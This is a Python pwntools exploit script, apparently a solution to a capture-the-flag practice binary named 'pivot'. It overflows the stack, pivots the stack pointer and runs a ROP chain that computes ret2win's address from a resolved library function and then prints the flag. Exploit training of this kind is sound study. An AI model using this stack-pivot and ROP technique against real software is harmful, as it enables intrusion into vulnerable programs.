import time

from pwn import *


EXECUTABLE = "./pivot"
context.binary = elf = ELF(EXECUTABLE)
lib_pivot = ELF("./libpivot.so")


p = process(EXECUTABLE)
if args.GDB:
    gdb.attach(p)


OFFSET = 40
if OFFSET is None:
    p.sendafter(b"> ", b"AAAA")
    p.sendafter(b"> ", cyclic(128, alphabet=b"ABCDEFGHIJKLMNOPQRSTUVWXYZ"))

    time.sleep(1)
    core = Coredump("./core")
    seg_addr = int("0x" + hex(core.fault_addr)[10:], 16)
    log.success(f"Core fault address at: {hex(core.fault_addr)}")
    log.info(f"Finding offset for {hex(seg_addr)}")
    offset = cyclic_find(seg_addr, alphabet=b"ABCDEFGHIJKLMNOPQRSTUVWXYZ")
    log.success(f"Offset found: {offset}")
    exit()


rop = ROP(elf)

p.recvuntil(b"to pivot: ")
pivot_point = int(p.recvline(keepends=False), 16)
log.debug(f"Pivot point: {hex(pivot_point)}")

# Send stack smash to pivot (size: 64)
stack_smash  = b"A" * OFFSET
# Pivot
stack_smash += p64(rop.rax.address) + p64(pivot_point)
stack_smash += p64(0x4009bd) # xchg rsp, rax; ret;

log.debug(f"Payload size: {len(stack_smash)}")

# Send pivot rop chain (size: 256)
ret2win_offset = 0xa81 - 0x96a

rop_chain  = p64(elf.plt.foothold_function)
# Set rax
rop_chain += p64(rop.rax.address) + p64(elf.got.foothold_function)
# Resolve pointer
rop_chain += p64(0x4009c0) # mov rax, qword ptr [rax]; ret;
# Set rpb
rop_chain += p64(rop.rbp.address) + p64(ret2win_offset)
# Add to rax
rop_chain += p64(0x4009c4) # add rax, rbp; ret;
# Jmp to rax
rop_chain += p64(0x4007c1) # jmp rax;


log.debug(f"Chain size: {len(rop_chain)}")

p.sendafter(b"> ", rop_chain)
p.sendafter(b"> ", stack_smash)

p.recvline() # Thank you
p.recvline() # Foothold function call

flag = str(p.recvline(), "UTF-8")
log.success(f"Flag: {flag}")
